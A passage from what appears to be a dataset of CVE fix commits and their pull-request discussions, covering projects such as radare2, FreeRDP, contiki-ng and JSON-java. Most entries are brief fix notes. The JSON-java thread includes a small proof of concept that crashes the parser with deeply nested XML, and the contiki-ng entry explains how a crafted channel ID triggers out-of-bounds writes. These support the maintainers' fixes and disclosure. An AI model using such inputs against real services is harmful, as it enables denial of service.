            "other_info": "Fixed CVE-2022-40761",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-43294",
            "commit_url": "https://github.com/arendst/Tasmota/commit/066878da4d4762a9b6cb169fdf353e804d735cfd",
            "commit_msg": " fix stack overflow vulnerability",
            "commit_msg_words": 4,
            "other_info": "fix stack overflow vulnerability swing of Chaitin Security Research Lab",
            "pr_title_words": 4,
            "comments_words": 6,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-4639",
            "commit_url": "https://github.com/yrutschle/sslh/commit/b19f8a6046b080e4c2e28354a58556bb26040c6f",
            "commit_msg": "fix possible format string exploit if packet dumping enabled\n\nSigned-off-by: Toni Uhlig <matzeton@googlemail.com>",
            "commit_msg_words": 13,
            "other_info": "fix possible format str vuln thanks for the fix! Apparently this got assigned [CVE-2022-4639](https://vuldb.com/?id.216497) even though no stable version is affected. Only the release candidate v2.0-rc1 contains the code introduced in https://github.com/yrutschle/sslh/commit/e5f16b93ce9686e54c65c0955bbab6e74becf318. Thanks for the heads-up. I don't know how to feel about sslh's first CVE...\r\nI'll release a rc2 with the fix (I want to further investigaute https://github.com/yrutschle/sslh/issues/368 before producing an actual release) Here, it's tagged and published!\r\nhttps://lists.rutschle.net/mailman/archives/sslh/2022-December/000753.html",
            "pr_title_words": 5,
            "comments_words": 65,
            "total_other_info_words": 70
        },
        {
            "cve-id": "CVE-2022-0476",
            "commit_url": "https://github.com/radareorg/radare2/commit/27fe8031782d3a06c3998eaa94354867864f9f1b",
            "commit_msg": "Fix DoS in the minidump parser ##crash\n\n* Reported by lazymio via huntr.dev\n* Reproducer: mdmp-dos",
            "commit_msg_words": 16,
            "other_info": "Fix DoS in the minidump parser ##crash",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-27942",
            "commit_url": "https://github.com/appneta/tcpreplay/commit/54297efdf9c0f08c87ef8162dede9fec6c21ee89",
            "commit_msg": "Bug #719 better overflow protection in parse_mpls",
            "commit_msg_words": 7,
            "other_info": "Bug #719 better overflow protection in parse_mpls",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2022-24913",
            "commit_url": "https://github.com/cowtowncoder/java-merge-sort/commit/450fdee70b5f181c2afc5d817f293efa1a543902",
            "commit_msg": "vuln-fix: Temporary File Information Disclosure\n\n\n\nThis fixes temporary file information disclosure vulnerability due to the use\nof the vulnerable `File.createTempFile()` method. The vulnerability is fixed by\nusing the `Files.createTempFile()` method which sets the correct posix permissions.\n\nWeakness: CWE-377: Insecure Temporary File\nSeverity: Medium\nCVSSS: 5.5\nDetection: CodeQL & OpenRewrite (https://public.moderne.io/recipes/org.openrewrite.java.security.SecureTempFileCreation)\n\nReported-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\nSigned-off-by: Jonathan Leitschuh <Jonathan.Leitschuh@gmail.com>\n\nBug-tracker: https://github.com/JLLeitschuh/security-research/issues/18\n\n\nCo-authored-by: Moderne <team@moderne.io>",
            "commit_msg_words": 63,
            "other_info": "[SECURITY] Fix Temporary File Information Disclosure Vulnerability\n Ok. Sounds reasonable. One consequence it that JDK baseline needs to be increased.\r\nAnd then at least increase minor version of the library (arguably could be major, but since API does not change I think minor is fine). Thank you @JLLeitschuh! I merged this in and released 1.1.0 to Maven central Hey @cowtowncoder,\n\nHappy to help! Do you think vulnerability disclosure is warranted here? If so, do you need assistance? I don't plan to file a disclosure myself but if you want to file one that would be perfectly fine, and I can add CVE id information etc in release notes as necessary.\r\n If you think this is a valid vulnerability, I'll ask Snyk to issue a CVE for us. \ud83d\ude42 Thank you @JLLeitschuh that makes sense; I assume this is a valid ID vuln. They are pretty good at fair evaluation of vulns and I think it makes sense for them to file for a CVE here.",
            "pr_title_words": 7,
            "comments_words": 158,
            "total_other_info_words": 165
        },
        {
            "cve-id": "CVE-2022-40759",
            "commit_url": "https://github.com/Samsung/mTower/commit/3c1a0d5d4aa2be44d119ad00bc579f49b8547968",
            "commit_msg": "Fixed CVE-2022-40759\n\nSigned-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",
            "commit_msg_words": 6,
            "other_info": "Fixed CVE-2022-40759",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-41926",
            "commit_url": "https://github.com/nextcloud/talk-android/commit/bb7e82fbcbd8c10d0d0128d736c41cec0f79e7d0",
            "commit_msg": "Use custom permission for unfiltered broadcast receiver in CallActivity\n\nSigned-off-by: \u00c1lvaro Brey <alvaro.brey@nextcloud.com>",
            "commit_msg_words": 13,
            "other_info": "Use custom permission for unfiltered broadcast receiver in CallActivity APK file: https://www.kaminsky.me/nc-dev/android-artifacts/2148-talk.apk <br/><br/> ![qrcode](https://www.kaminsky.me/nc-dev/android-artifacts/2148-talk.png) <br/><br/>To test this change/fix you can simply download above APK file and install and test it in parallel to your existing Nextcloud Talk app.  <h1>Lint</h1><table width='500' cellpadding='5' cellspacing='2'><tr class='tablerow0'><td>Type</td><td><a href='https://www.kaminsky.me/nc-dev/talk-lint/master.html'>master</a></td><td><a href='https://www.kaminsky.me/nc-dev/talk-lint/4214.html'>PR</a></td></tr><tr class='tablerow1'><td>Warnings</td><td>122</td><td>122</td></tr><tr class='tablerow0'><td>Errors</td><td>2</td><td>2</td></tr></table>       <h1><a href='https://www.kaminsky.me/nc-dev/talk-findbugs/4214.html'>SpotBugs</a> (new)</h1>      <table width='500' cellpadding='5' cellspacing='2'>         <tr class='tableheader'>            <th align='left'>Warning Type</th>            <th align='right'>Number</th>         </tr>         <tr class='tablerow0'>            <td>               Bad practice Warnings            </td>            <td align='right'>8</td>         </tr>         <tr class='tablerow1'>            <td>               Correctness Warnings            </td>            <td align='right'>35</td>         </tr>         <tr class='tablerow0'>            <td>               Experimental Warnings            </td>            <td align='right'>2</td>         </tr>         <tr class='tablerow1'>            <td>               Internationalization Warnings            </td>            <td align='right'>9</td>         </tr>         <tr class='tablerow0'>            <td>               Malicious code vulnerability Warnings            </td>            <td align='right'>23</td>         </tr>         <tr class='tablerow1'>            <td>               Performance Warnings            </td>            <td align='right'>23</td>         </tr>         <tr class='tablerow0'>            <td>               Security Warnings            </td>            <td align='right'>2</td>         </tr>         <tr class='tablerow1'>            <td>               Dodgy code Warnings            </td>            <td align='right'>72</td>         </tr>         <tr class='tablerow0'>            <td>               <b>Total</b>            </td>            <td align='right'>               <b>174</b>            </td>         </tr>      </table>       <h1><a href='https://www.kaminsky.me/nc-dev/talk-findbugs/master.html'>SpotBugs</a> (master)</h1>      <table width='500' cellpadding='5' cellspacing='2'>         <tr class='tableheader'>            <th align='left'>Warning Type</th>            <th align='right'>Number</th>         </tr>         <tr class='tablerow0'>            <td>               Bad practice Warnings            </td>            <td align='right'>8</td>         </tr>         <tr class='tablerow1'>            <td>               Correctness Warnings            </td>            <td align='right'>35</td>         </tr>         <tr class='tablerow0'>            <td>               Experimental Warnings            </td>            <td align='right'>2</td>         </tr>         <tr class='tablerow1'>            <td>               Internationalization Warnings            </td>            <td align='right'>9</td>         </tr>         <tr class='tablerow0'>            <td>               Malicious code vulnerability Warnings            </td>            <td align='right'>23</td>         </tr>         <tr class='tablerow1'>            <td>               Performance Warnings            </td>            <td align='right'>23</td>         </tr>         <tr class='tablerow0'>            <td>               Security Warnings            </td>            <td align='right'>2</td>         </tr>         <tr class='tablerow1'>            <td>               Dodgy code Warnings            </td>            <td align='right'>72</td>         </tr>         <tr class='tablerow0'>            <td>               <b>Total</b>            </td>            <td align='right'>               <b>174</b>            </td>         </tr>      </table>    So merge?",
            "pr_title_words": 9,
            "comments_words": 244,
            "total_other_info_words": 253
        },
        {
            "cve-id": "CVE-2022-39316",
            "commit_url": "https://github.com/FreeRDP/FreeRDP/commit/e865c24efc40ebc52e75979c94cdd4ee2c1495b0",
            "commit_msg": "Added missing length checks in zgfx_decompress_segment\n\n(cherry picked from commit 64716b335858109d14f27b51acc4c4d71a92a816)",
            "commit_msg_words": 11,
            "other_info": "length check fixes backport \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8282/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8299/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8302/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8308/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8315/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8318/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8330/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8338/\n \nRefer to this link for build results (access rights to CI server needed): \nhttps://ci.freerdp.com//job/PullRequestTester/8342/",
            "pr_title_words": 4,
            "comments_words": 126,
            "total_other_info_words": 130
        },
        {
            "cve-id": "CVE-2022-40363",
            "commit_url": "https://github.com/flipperdevices/flipperzero-firmware/commit/e77bf962323f98fc4edb4e94f392b06ab7790418",
            "commit_msg": "fix buffer overflow in mifar ul load",
            "commit_msg_words": 7,
            "other_info": "fix buffer overflow in mifare ul load Hello @VVX7 . Am I right that there is no actual NFC tag with so many pages? This file was made by hands? hiya @gornekich , that's right. The file was made by hand. The risk comes from someone inserting a malicious file into database of Amiibos or something similar as I linked above.\r\n\r\nMight also be able to emulate an NFC with unusually high page count using a proxmark or hydrabus, idk.  I should go poke at that...",
            "pr_title_words": 7,
            "comments_words": 79,
            "total_other_info_words": 86
        },
        {
            "cve-id": "CVE-2022-4399",
            "commit_url": "https://github.com/TicklishHoneyBee/nodau/commit/7a7d737a3929f335b9717ddbd31db91151b69ad2",
            "commit_msg": "Use parametetrized SQL statement\n\nMove to parametetrized SQL statement allows using chars like \"'\" in\nnotes and also avoid sql injection",
            "commit_msg_words": 21,
            "other_info": "Use parametetrized SQL statement to allow special chars Hi, so this is a great idea, but there's a couple of issues with it as is.\r\n\r\nFirstly, if statements with only a single line body (and no else) don't needed braces. You've added a bit of a mix and match of this so please remove some braces (most notably, around line 316 of db.c). Also some spaces were added around an '}else{' making it '} else {' and different to every other else in the project.\r\n\r\nSecondly, you've used sqlite3_errmsg directly inside a printf in a couple of places, please either read directly from db_data.error_msg (if set), or use the included wrapper function db_err which prevents a NULL return that can cause segfaults in some printf implementations. Also, being system/internal error messages, these should use fprintf to output to stderr rather than stdout.\r\n\r\n Hi @TicklishHoneyBee , thanks for your reply. I will follow your guidelines and perform additional commit. Hi @TicklishHoneyBee , I followed your guidelines in my last commit.",
            "pr_title_words": 8,
            "comments_words": 161,
            "total_other_info_words": 169
        },
        {
            "cve-id": "CVE-2022-0676",
            "commit_url": "https://github.com/radareorg/radare2/commit/c84b7232626badd075caf3ae29661b609164bac6",
            "commit_msg": "Fix heap buffer overflow in dyldcache parser ##crash\n\n* Reported by: Lazymio via huntr.dev\n* Reproducer: dyldovf",
            "commit_msg_words": 17,
            "other_info": "Fix heap buffer overflow in dyldcache parser ##crash Verified the fix works.",
            "pr_title_words": 8,
            "comments_words": 4,
            "total_other_info_words": 12
        },
        {
            "cve-id": "CVE-2022-40757",
            "commit_url": "https://github.com/Samsung/mTower/commit/ab9d06d51ff8c3eab9ba9ea85e422179dbd12b15",
            "commit_msg": "Fixed CVE-2022-40760\n\nSigned-off-by: Taras Drozdovskyi <t.drozdovsky@samsung.com>",
            "commit_msg_words": 6,
            "other_info": "Fixed CVE-2022-40760",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-29777",
            "commit_url": "https://github.com/ONLYOFFICE/core/commit/b17d5e860f30e8be2caeb0022b63be4c76660178",
            "commit_msg": "Fix 34, 35, 37",
            "commit_msg_words": 4,
            "other_info": "Fix/bugs y",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-39312",
            "commit_url": "https://github.com/dataease/dataease/commit/956ee2d6c9e81349a60aef435efc046888e10a6d",
            "commit_msg": "fix(\u6570\u636e\u6e90): Mysql jdbc\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e",
            "commit_msg_words": 3,
            "other_info": "fix(\u6570\u636e\u6e90): Mysql jdbc\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2022-35926",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/a4597001d50a04f4b9c78f323ba731e2f979802c",
            "commit_msg": "Check whether there is enough space for ND6 option headers when processing\nincoming packets.",
            "commit_msg_words": 14,
            "other_info": "uip-nd6: Check buffer space for ND6 option headers.",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-23544",
            "commit_url": "https://github.com/metersphere/metersphere/commit/d0f95b50737c941b29d507a4cc3545f2dc6ab121",
            "commit_msg": "fix(\u6d4b\u8bd5\u8ddf\u8e2a): \u7f3a\u9677\u5e73\u53f0\u8bf7\u6c42\u8f6c\u53d1\u6dfb\u52a0\u767d\u540d\u5355",
            "commit_msg_words": 2,
            "other_info": "fix(\u6d4b\u8bd5\u8ddf\u8e2a): \u7f3a\u9677\u5e73\u53f0\u8bf7\u6c42\u8f6c\u53d1\u6dfb\u52a0\u767d\u540d\u5355 [APPROVALNOTIFIER] This PR is **NOT APPROVED**\n\nThis pull-request has been approved by:\nTo complete the [pull request process](https://git.k8s.io/community/contributors/guide/owners.md#the-code-review-process), please assign **fit2-zhao** after the PR has been reviewed.\nYou can assign the PR to them by writing `/assign @fit2-zhao` in a comment when ready.\n\nThe full list of commands accepted by this bot can be found [here](https://go.k8s.io/bot-commands?repo=metersphere%2Fmetersphere).\n\n<details open>\nNeeds approval from an approver in each of these files:\n\n- **[OWNERS](https://github.com/metersphere/metersphere/blob/main/OWNERS)**\n\nApprovers can indicate their approval by writing `/approve` in a comment\nApprovers can cancel approval by writing `/approve cancel` in a comment\n</details>\n<!-- META={\"approvers\":[\"fit2-zhao\"]} -->",
            "pr_title_words": 2,
            "comments_words": 96,
            "total_other_info_words": 98
        },
        {
            "cve-id": "CVE-2022-1437",
            "commit_url": "https://github.com/radareorg/radare2/commit/669a404b6d98d5db409a5ebadae4e94b34ef5136",
            "commit_msg": "Fix oobread and null deref in symbols file parser ##crash\n\n* Reported by @cnitlrt\n* BountyID: af6c3e9e-b7df-4d80-b48f-77fdd17b4038/\n* Reproducer: symoob",
            "commit_msg_words": 20,
            "other_info": "Fix oobread and null deref in symbols file parser ##crash",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-0523",
            "commit_url": "https://github.com/radareorg/radare2/commit/35482cb760db10f87a62569e2f8872dbd95e9269",
            "commit_msg": "Fix UAF in pyc parser ##crash\n\n* Reported by Cen Zhang via huntr.dev\n* Reproducer: bins/fuzzed/harep2.pyc",
            "commit_msg_words": 16,
            "other_info": "Fix UAF in pyc parser ##crash",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2022-22893",
            "commit_url": "https://github.com/jerryscript-project/jerryscript/commit/b4eecfc24ff7752467f0324139425463ecc5ff4f",
            "commit_msg": "Add stack-overflow check for general [[Construct]] method of function objects\n\nThis patch fixes #4901\n\nJerryScript-DCO-1.0-Signed-off-by: Martin Negyokru negyokru@inf.u-szeged.hu",
            "commit_msg_words": 18,
            "other_info": "Add stack-overflow check for general [[Construct]] method of function objects",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2022-24831",
            "commit_url": "https://github.com/OpenClinica/OpenClinica/commit/b152cc63019230c9973965a98e4386ea5322c18f",
            "commit_msg": "OC-17141: fix reported SQL injection issues",
            "commit_msg_words": 6,
            "other_info": "OC-17141 \ud83d\udc4d",
            "pr_title_words": 1,
            "comments_words": 1,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2022-1341",
            "commit_url": "https://github.com/vgropp/bwm-ng/commit/9774f23bf78a6e6d3ae4cfe3d73bad34f2fdcd17",
            "commit_msg": "Fix https://github.com/vgropp/bwm-ng/issues/26",
            "commit_msg_words": 2,
            "other_info": "Fix potential write to unallocated memory. Committed as suggested. If you want me to rebase/squash, PLMK.",
            "pr_title_words": 6,
            "comments_words": 10,
            "total_other_info_words": 16
        },
        {
            "cve-id": "CVE-2022-41873",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/f28ca563e3882d4719d56f3bcd50a4e74edfa0ea",
            "commit_msg": "Fix l2cap_channels OOB in get_channel_for_cid\n\nWhile the bounds check is performed on `l2cap_channel_count`, only the lower byte is checked due to the uint8_t data type. Afterwards, the expression for `i` is re-calculated without the explicit data type, which means without truncation into 8 bits. Instead, the full 16-bit value is used as the channel index. This pointer will point out-of-bounds of the channel array.\r\n\r\nThis leads to a large 16 out-of-bounds channel id to be used as an index into the array for large CID inputs.\r\n\r\nSample value: 0xff41 -> 0xff41 - 0x41 = 0xff00 == 0x00 (as uint8_t)\r\n\r\nThis results in out-of-bounds memory to be interpreted as a channel object, and this memory to potentially be corrupted in the following call to `input_l2cap_frame_flow_channel`, which fills the out-of-bounds memory (the supposed channel object) with user-supplied data.\r\n\r\nThe fix here is to re-use the `i` variable as an index, which was used to perform the bounds check, and is truncated to 8 bits.\r\n\r\nAs a side note, due to the unsignedness of the data type `uint8_t i`, the check `i >= 0` is always true. Instead, a signed data type such as `int16_t` could be used to make the check take effect.",
            "commit_msg_words": 201,
            "other_info": "Fix l2cap_channels OOB in get_channel_for_cid",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2022-46377",
            "commit_url": "https://github.com/weston-embedded/uC-FTPs/commit/2bbf7c6111766f626923ca5acd29ea827ea5128f",
            "commit_msg": "Patched DoS vulnerabilities CVE-2022-46377 and CVE-2022-46378 / TALOS-2022-1681.",
            "commit_msg_words": 8,
            "other_info": "Patched DoS vulnerabilities CVE-2022-46377 and CVE-2022-46378 / TALOS-2022-1681.",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2022-45688",
            "commit_url": "https://github.com/stleary/JSON-java/commit/f566a1d9ee1f8139357017dc6c7def1da19cd8d4",
            "commit_msg": "fix: limit the nesting depth",
            "commit_msg_words": 5,
            "other_info": "Limit the XML nesting depth for CVE-2022-45688 I agree I think there should be a reasonable default set.  and people need to override it if they need more depth.\r\n @cleydyr Sorry, my preference of not enforcing a default limit was not the best idea. Can you set a non-negative default value instead? ChatGPT suggests several hundred, which sounds reasonable to me.  **What problem does this code solve?**\r\nFixes [CVE-2022-454688](https://nvd.nist.gov/vuln/detail/CVE-2022-45688)\r\nA stack overflow in the XML.toJSONObject component of hutool-json v5.8.10 allows attackers to cause a Denial of Service (DoS) via crafted JSON or XML data.\r\n\r\n**Risks**\r\nModerate. This is a breaking change, although it is unlikely that any users are parsing XML nested more than 512 levels.\r\n\r\n**Changes to the API?**\r\nNo\r\n\r\n**Will this require a new release?**\r\nYes\r\n\r\n**Should the documentation be updated?**\r\nNo\r\n\r\n**Does it break the unit tests?**\r\nNo, new unit tests were added\r\n\r\n**Was any code refactored in this commit?**\r\nNo\r\n\r\n**Review status**\r\n**APPROVED** Starting 3 day comment window Can someone merge this change so that we get the latest fixed release available.  No, no, no. 512 levels? Why? Have you tested it on java 19 server mode? @javadev I have not tested this with Java 19 server mode. Do you want to recommend a different value than 512 levels?\r\n We may create a test that checks for stack overflow and configure  GitHub actions with java 19. If this error happened this check may be added if not - no errors with recommendation to update with latest java. > We may create a test that checks for stack overflow and configure GitHub actions with java 19. If this error happened this check may be added if not - no errors with recommendation to update with latest java.\r\n\r\nHow is it expected that Java 19 isn't susceptible to StackOverflowError's due to recursion?\r\nAnd even if somehow it is, recommending users to update to a newer version of Java instead of implementing a proper recursion limit seems irresponsible. > > We may create a test that checks for stack overflow and configure GitHub actions with java 19. If this error happened this check may be added if not - no errors with recommendation to update with latest java.\r\n> \r\n> How is it expected that Java 19 isn't susceptible to StackOverflowError's due to recursion? And even if somehow it is, recommending users to update to a newer version of Java instead of implementing a proper recursion limit seems irresponsible.\r\n\r\n```\r\n$ cat Foo.java\r\npublic class Foo {\r\n  public static void main(String[] args) {\r\n    System.out.println(System.getProperty(\"java.version\"));\r\n    recursion();\r\n  }\r\n\r\n  static void recursion() {\r\n    recursion();\r\n  }\r\n}\r\n\r\n$ java -XX:MaxJavaStackTraceDepth=6 Foo.java\r\n19.0.2\r\nException in thread \"main\" java.lang.StackOverflowError\r\n\tat Foo.recursion(Foo.java:8)\r\n``` The default value for stack size is bigger for latest java. > The default value for stack size is bigger for latest java.\r\n\r\nHow is that expected to prevent a StackOverflowError due to recursion? Doesn't the `JSONML` class need a similar change?\r\n\r\n```\r\n$ cat poc.java\r\npublic class poc {\r\n  public static void main(String[] args) {\r\n    String s = new String(new char[12000]).replace(\"\\0\", \"<a>\");\r\n    org.json.JSONML.toJSONObject(s);\r\n  }\r\n}\r\n\r\n$ java -XX:MaxJavaStackTraceDepth=11 -cp json-20220924.jar poc.java\r\nException in thread \"main\" java.lang.StackOverflowError\r\n\tat org.json.JSONML.parse(JSONML.java:48)\r\n\tat org.json.JSONML.parse(JSONML.java:184)\r\n\tat org.json.JSONML.parse(JSONML.java:184)\r\n\tat org.json.JSONML.parse(JSONML.java:184)\r\n``` @norrisjeremy Both JSONML and JSONObject/Array should probably have this check. As mentioned earlier, the spec allows implementations to set this type of limit. Let's see the response to the change in XML before proceeding with the other fixes. @stleary any new release coming one of these days? @luposlip letting a more few days go by for comments in case we missed something. If all goes well I will push the release out in a couple more days. Will you be fixing the other instances that can result in a StackOverflowError before generating a new release?\r\nIt would be nice to not have to chase this issue across multiple updates to fully resolve. @norrisjeremy I thought the CVE only applied to XML transformations to JSON. \r\nFor now, I just want to see how the XML change goes. If there are no problems, the other classes can also be changed. But there is no ETA at this time. So other code paths that share similar properties (i.e., they can cause a StackOverflowError to be thrown due to deep recursion) will not be immediately addressed? @norrisjeremy The scope of this issue is XML and the CVE. XML parsing is a special imperfect case due to the nature of XML, so more latitude is allowed for code changes. JSON parsing does not have this case so we are more cautious. For example, how do we know whether setting this default hard limit will break an application that was able to parse e.g. JSON objects with nesting depth of 600? @stleary The `JSONML` class is used to (quoted from the class Javadoc):\r\n> convert an XML text into a JSONArray or JSONObject, ...<snip>... using the JsonML transform.\r\n\r\nAs such, this class can be in scope of the above CVE, or a similar future CVE that has not yet been created.\r\n\r\nI think wherever XML parsing is used in this library, this vulnerability should be addressed.\r\n\r\nThose further fixes can be added in a future patch release - although delaying those fixes may result in the upcoming release to be still marked as vulnerable. A number of people have raised the valid point that JSONML and JsonObject/Array should have this protection as well. \r\nNo objection if anyone wants to address this, to be included in the next release. \r\nWe don't have an equivalent to XMLParserConfiguration, so something will have to be done about that - either add parser config types or come up with some other way to configure the parsers. My preference would be to add new parser config types, but I am open to other approaches.  See #722  Personally I'd like a fast release to address the CVE, if the XML parser\nfix resolves it.\n\ntor. 9. feb. 2023 19.00 skrev Sean Leary ***@***.***>:\n\n> A number of people have raised the valid point that JSONML and\n> JsonObject/Array should have this protection as well.\n> No objection if anyone wants to address this, to be included in the next\n> release.\n> We don't have an equivalent to XMLParserConfiguration, so something will\n> have to be done about that - either add parser config types or come up with\n> some other way to configure the parsers. My preference would be to add new\n> parser config types, but I am open to other approaches. See #722\n> <https://github.com/stleary/JSON-java/issues/722>\n>\n> \u2014\n> Reply to this email directly, view it on GitHub\n> <https://github.com/stleary/JSON-java/pull/720#issuecomment-1424598339>,\n> or unsubscribe\n> <https://github.com/notifications/unsubscribe-auth/AAF2N27KX33MSIHWEXOTM5TWWUWFVANCNFSM6AAAAAAUN34BLQ>\n> .\n> You are receiving this because you were mentioned.Message ID:\n> ***@***.***>\n>\n @stleary: Since #708 and #722 are both fixed, when may we expect a new release that contains these fixes for CVE-2022-4568? Should be later this week. Hi there, very quick check. A week has passed (from last comment, that release should be later this week). Do you guys have any ETA of this release? :pray: \r\n\r\nNormally, I wouldn't push it but as one of issues have quite high CVSS score, it is kind of a deal for us :-) Same here, we're considering alternatives because of the critical score.\r\n\r\n I can release it now, so ETA = today Released, and should appear in the Maven repo in the next few hours. Its in Maven Central!  Thank you everyone!",
            "pr_title_words": 7,
            "comments_words": 1235,
            "total_other_info_words": 1242
        },
        {
            "cve-id": "CVE-2022-26126",
            "commit_url": "https://github.com/FRRouting/frr/commit/ac3133450de12ba86c051265fc0f1b12bc57b40c",
            "commit_msg": "isisd: fix #10505 using base64 encoding\n\nUsing base64 instead of the raw string to encode\nthe binary data.\n\nSigned-off-by: whichbug <whichbug@github.com>",
            "commit_msg_words": 21,
            "other_info": "isisd: use base64 to encode the binary data. <details><summary>Continuous Integration Result: SUCCESSFUL</summary>\n\n#  Continuous Integration Result: SUCCESSFUL\n\nCongratulations, this patch passed basic tests\n\nTested-by: NetDEF / OpenSourceRouting.org CI System\n\nCI System Testrun URL: https://ci1.netdef.org/browse/FRR-PULLREQ2-3385/\n\nThis is a comment from an automated CI system.\nFor questions and feedback in regards to this CI system, please feel free to email\nMartin Winter - mwinter (at) opensourcerouting.org.\n\n\n### Warnings Generated during build:\n\n<details><summary>Checkout code: Successful with additional warnings</summary>\n\n    <stdin>:87: trailing whitespace.\n     * \n    <stdin>:89: trailing whitespace.\n     * \n    <stdin>:96: trailing whitespace.\n     * \n    <stdin>:104: trailing whitespace.\n     * \n    warning: 4 lines add whitespace errors.\n    Report for base64.c | 213 issues\n    ===============================================\n    ERROR: trailing whitespace\n    #5: FILE: /tmp/f1-14533/base64.c:5:\n    + * $\n    \n    ERROR: trailing whitespace\n    #7: FILE: /tmp/f1-14533/base64.c:7:\n    + * $\n    \n    ERROR: trailing whitespace\n    #14: FILE: /tmp/f1-14533/base64.c:14:\n    + * $\n    \n    ERROR: trailing whitespace\n    #22: FILE: /tmp/f1-14533/base64.c:22:\n    + * $\n    \n    ERROR: that open brace { should be on the previous line\n    #91: FILE: /tmp/f1-14533/base64.c:91:\n    +static const unsigned char pr2six[256] =\n    +{\n    \n    WARNING: please, no spaces at the start of a line\n    #93: FILE: /tmp/f1-14533/base64.c:93:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #94: FILE: /tmp/f1-14533/base64.c:94:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #95: FILE: /tmp/f1-14533/base64.c:95:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,$\n    \n    WARNING: please, no spaces at the start of a line\n    #96: FILE: /tmp/f1-14533/base64.c:96:\n    +    52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #97: FILE: /tmp/f1-14533/base64.c:97:\n    +    64,  0,  1,  2,  3,  4,  5,  6,  7,  8,  9, 10, 11, 12, 13, 14,$\n    \n    WARNING: please, no spaces at the start of a line\n    #98: FILE: /tmp/f1-14533/base64.c:98:\n    +    15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #99: FILE: /tmp/f1-14533/base64.c:99:\n    +    64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,$\n    \n    WARNING: please, no spaces at the start of a line\n    #100: FILE: /tmp/f1-14533/base64.c:100:\n    +    41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #101: FILE: /tmp/f1-14533/base64.c:101:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #102: FILE: /tmp/f1-14533/base64.c:102:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #103: FILE: /tmp/f1-14533/base64.c:103:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #104: FILE: /tmp/f1-14533/base64.c:104:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #105: FILE: /tmp/f1-14533/base64.c:105:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #106: FILE: /tmp/f1-14533/base64.c:106:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces at the start of a line\n    #107: FILE: /tmp/f1-14533/base64.c:107:\n    +    64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,$\n    \n    WARNING: please, no spaces 